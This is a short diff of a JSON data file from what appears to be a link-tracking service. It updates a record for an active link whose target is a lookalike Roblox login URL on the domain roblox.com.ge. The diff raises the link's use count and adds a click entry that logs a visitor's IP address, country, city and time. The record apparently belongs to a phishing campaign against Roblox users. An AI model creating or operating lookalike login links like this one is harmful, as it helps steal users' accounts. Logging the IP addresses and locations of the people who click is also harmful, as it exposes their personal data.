@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1283,
+    "useCount": 1284,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10408,6 +10408,14 @@
         "city": "Geislingen an der Steige",
         "flag": "🇩🇪",
         "countryCode": "DE"
+      },
+      {
+        "timestamp": 1777367785082,
+        "ip": "165.101.14.254",
+        "country": "Philippines",
+        "city": "Santa Teresa First",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
